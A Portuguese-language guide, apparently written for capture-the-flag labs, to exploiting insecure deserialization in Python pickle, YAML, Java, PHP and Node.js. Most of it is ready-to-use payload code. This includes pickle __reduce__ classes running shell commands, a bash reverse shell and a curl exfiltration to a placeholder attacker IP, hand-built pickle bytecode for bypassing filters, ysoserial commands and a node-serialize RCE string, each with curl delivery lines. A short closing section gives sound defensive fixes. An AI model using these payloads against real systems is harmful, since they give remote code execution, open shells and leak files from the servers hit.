# Insecure Deserialization — Guia Completo

> A app deserializa dados do utilizador (pickle, YAML, Java objects) sem validação. Permite execução de código arbitrário (RCE).

## CWE
- CWE-502 — Deserialization of Untrusted Data

---

## Como reconhecer

- A app aceita **blobs base64** (restore session, import workspace, load config)
- Campos com nomes sugestivos: `blob`, `data`, `session`, `state`, `workspace`, `backup`
- Headers como `Content-Type: application/x-python-pickle`, `application/x-java-serialized-object`
- A app é Python e aceita ficheiros de estado/sessão → provavelmente pickle
- A app aceita YAML (config, import) → possível YAML deserialization

---

## Conceito

**Serialização** = converter um objeto em memória para bytes/string (para guardar ou transmitir).
**Deserialização** = reconstruir o objeto a partir dos bytes/string.

O problema: durante a deserialização, o interpretador pode **executar código** embutido nos dados. Se os dados vêm do utilizador → **RCE**.

---

## Python — pickle

### Como funciona
`pickle.loads()` reconstrói objetos Python. O método `__reduce__` diz ao pickle como reconstruir — e pode chamar **qualquer função**.

### Payload — executar comando
```python
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('cat /flag/flag',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

```bash
# Gerar e enviar
BLOB=$(python3 -c "
import pickle, base64, os
class E:
    def __reduce__(self):
        return (os.system, ('cat /flag/flag',))
print(base64.b64encode(pickle.dumps(E())).decode())
")
curl -X POST http://TARGET/restore -d "blob=$BLOB"
```

### Payload — ler ficheiro (retornar conteúdo)
```python
class Exploit:
    def __reduce__(self):
        return (open, ('/flag/flag',))
```

### Payload — reverse shell
```python
class Exploit:
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/TEU_IP/9900 0>&1"',))
```

### Payload — exfiltrar via HTTP
```python
class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://TEU_IP:9900/$(cat /flag/flag | base64)',))
```

### Payload sem import direto (bypass de filtros)
```python
import pickle, base64

# Construir pickle bytecode manualmente
payload = b"cos\nsystem\n(S'cat /flag/flag'\ntR."
print(base64.b64encode(payload).decode())
```

Formato do bytecode pickle:
```
c     → GLOBAL (import module.name)
os    → module
system → name
(     → MARK
S     → STRING
'cat /flag/flag'
t     → TUPLE
R     → REDUCE (chamar a função)
.     → STOP
```

---

## Python — YAML

### yaml.load (inseguro)
```python
import yaml
data = yaml.load(user_input)  # PERIGOSO — executa código Python
```

### Payloads
```yaml
# Executar comando
!!python/object/apply:os.system ['cat /flag/flag']

# Alternativa
!!python/object/new:subprocess.check_output [['cat', '/flag/flag']]

# Ler ficheiro
!!python/object/apply:builtins.open ['/flag/flag']
```

```bash
curl -X POST http://TARGET/import \
  -H "Content-Type: application/x-yaml" \
  -d "!!python/object/apply:os.system ['cat /flag/flag']"
```

---

## Java — Serialized Objects

### Reconhecer
- Content-Type: `application/x-java-serialized-object`
- Bytes começam com `AC ED 00 05` (magic bytes) → base64: `rO0ABQ==`
- Headers ou cookies com `rO0ABQ` → objeto Java serializado

### Exploração
Usar **ysoserial** (tool):
```bash
java -jar ysoserial.jar CommonsCollections1 "cat /flag/flag" | base64
```

Gadget chains comuns:
- `CommonsCollections1` a `CommonsCollections7` (Apache Commons)
- `Spring1`, `Spring2` (Spring Framework)
- `Groovy1` (Groovy)

### Enviar
```bash
PAYLOAD=$(java -jar ysoserial.jar CommonsCollections1 "cat /flag/flag" | base64 -w0)
curl -X POST http://TARGET/api \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary "@payload.bin"
```

---

## PHP — unserialize

### Reconhecer
Dados que parecem: `O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}`

### Payload
```php
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
```

Mais avançado — se há classes com `__wakeup()`, `__destruct()`, `__toString()`:
```php
// Depende das classes disponíveis no código
// Procurar gadget chains
```

---

## Node.js — node-serialize

### Reconhecer
JSON com funções serializadas, ex: `{"rce":"_$$ND_FUNC$$_function(){...}()"}`

### Payload
```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('cat /flag/flag')}()"}
```

```bash
curl -X POST http://TARGET/api \
  -H "Content-Type: application/json" \
  -d '{"rce":"_$$ND_FUNC$$_function(){require(\"child_process\").execSync(\"cat /flag/flag\")}()"}'
```

---

## Árvore de decisão

```
A app aceita dados serializados?
├── Blob base64 / campo "restore" / "import"
│   ├── Python (Flask/Django) → pickle payload
│   ├── Java → ysoserial
│   └── PHP → unserialize gadget
│
├── YAML input
│   └── Testar !!python/object/apply:os.system
│
├── JSON com _$$ND_FUNC$$_
│   └── node-serialize payload
│
└── Cookie/header com rO0ABQ
    └── Java serialized object → ysoserial
```

---

## Detetar se é pickle (sem documentação)

```bash
# Descodificar o blob e procurar magic bytes
echo "BLOB_BASE64" | base64 -d | xxd | head

# Pickle Python 3 começa com: 80 04 ou 80 05 (protocol 4/5)
# Pickle Python 2 começa com: ( ou c
```

---

## Fix correto

```python
# NUNCA deserializar dados de utilizadores com pickle
# pickle.loads(user_data)  ← NUNCA

# Usar formatos seguros
import json
data = json.loads(user_input)      # JSON — seguro, sem execução de código

# YAML seguro
import yaml
data = yaml.safe_load(user_input)  # safe_load — ignora tags perigosas
# NUNCA yaml.load(user_input)

# Se precisas de serializar objetos complexos
import jsonpickle
# Configurar para não permitir classes arbitrárias
```

```java
// Java — usar whitelisting
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.myapp.*;!*"  // só permitir classes do teu pacote
);
ObjectInputStream ois = new ObjectInputStream(input);
ois.setObjectInputFilter(filter);
```

**Princípio:** nunca deserializar dados de utilizadores com formatos que permitem execução de código. Usar JSON, protobuf, ou MessagePack — formatos que representam apenas dados, não código.
